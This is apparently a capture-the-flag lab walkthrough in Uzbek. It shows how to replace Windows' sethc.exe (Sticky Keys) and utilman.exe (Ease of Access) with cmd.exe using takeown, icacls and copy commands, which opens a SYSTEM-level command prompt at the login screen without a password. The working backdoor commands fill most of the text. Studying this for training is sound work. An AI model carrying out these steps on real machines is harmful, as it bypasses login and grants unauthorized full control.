## 🎯 Maqsad:

* Windows tizimiga **foydalanuvchi parolini bilmasdan** kirish.
* Fizik yoki RDP orqali kirish imkoniyati bo‘lsa, **login ekranida** ishlaydigan tizim xizmatlarini **backdoor qilish** orqali **SYSTEM darajasida CMD oynasi ochiladi**.

---

## 🛠 1-USUL: **Sticky Keys orqali backdoor qilish**

### ❓ Sticky Keys nima?

* Windowsda **SHIFT tugmasini 5 marta** bosganda, `sethc.exe` (Sticky Keys interface) ishga tushadi.
* Bu funksiyadan **login ekrani**da ham foydalanish mumkin.

### 🔥 Exploit g‘oyasi:

`C:\Windows\System32\sethc.exe` ni `cmd.exe` bilan almashtirsak, **SHIFT x5** bosganda **SYSTEM huquqdagi CMD** ochiladi!

---

### ⚙️ Amaliy bosqichlar:

1. `sethc.exe` fayliga egalik qilish:

```cmd
takeown /f c:\Windows\System32\sethc.exe
```

2. Faylga to‘liq huquq berish:

```cmd
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
```

3. `cmd.exe` faylini o‘rniga nusxalash:

```cmd
copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

> So‘rasa: `Overwrite?` deb — `Yes` deb yozing

4. **Ekranni bloklash (lock qilish):**

```cmd
rundll32.exe user32.dll,LockWorkStation
```

yoki start menudan `Lock`.

5. Login ekranida **SHIFT tugmasini 5 marta** bosing.

🎉 Natija: `cmd.exe` oynasi ochiladi — **SYSTEM huquqida** ishlaydi!

---

### 🎯 Flag olish:

```cmd
C:\flags\flag14.exe
```

---

## 🛠 2-USUL: **Utilman.exe orqali backdoor qilish**

### ❓ Utilman.exe nima?

* Login ekranidagi **"Ease of Access"** tugmasi — `utilman.exe` ni ishga tushiradi.
* Bu fayl SYSTEM huquqlarida ishlaydi.

### 🔥 Exploit g‘oyasi:

`C:\Windows\System32\Utilman.exe` ni `cmd.exe` bilan almashtirsak, **Ease of Access** tugmasi orqali **SYSTEM CMD** ochiladi.

---

### ⚙️ Amaliy bosqichlar:

1. `utilman.exe` fayliga egalik qilish:

```cmd
takeown /f c:\Windows\System32\utilman.exe
```

2. To‘liq ruxsat berish:

```cmd
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
```

3. `cmd.exe` faylini o‘rniga nusxalash:

```cmd
copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

4. Ekranni lock qilish:

```cmd
rundll32.exe user32.dll,LockWorkStation
```

5. Login ekranida pastki o‘ng burchakdagi **"Ease of Access"** ni bosing.

🎉 Natija: `cmd.exe` ochiladi — **SYSTEM huquqlarida!**

---

### 🎯 Flag olish:

```cmd
C:\flags\flag15.exe
```

---

## ⚠️ Eslatma:

* Har ikkala usulda ham SYSTEM darajasida ishlayotgan CMD oynasi ochiladi.
* Bu orqali foydalanuvchi parolisiz foydalanuvchi yaratish, xizmatlarni boshqarish, registry o‘zgartirish, va h.k. mumkin bo‘ladi.
* Foydalanuvchi ishi tugagach, asl `sethc.exe` va `utilman.exe` fayllarini qayta tiklash tavsiya qilinadi.
